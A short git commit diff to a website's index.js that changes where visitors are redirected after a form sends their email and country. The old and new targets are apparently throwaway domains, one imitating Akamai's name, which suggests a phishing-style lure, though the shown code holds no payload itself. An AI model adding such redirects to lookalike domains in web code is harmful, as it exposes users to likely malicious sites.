a38773a8621ba1154c66094c1c76dd2b4845b6d2
husknet <127146284+husknet@users.noreply.github.com>
2024-09-10 11:40:30 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://nerd.akamai-root.shop/';
+        window.location.href = 'https://sg.saga-sh.click/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
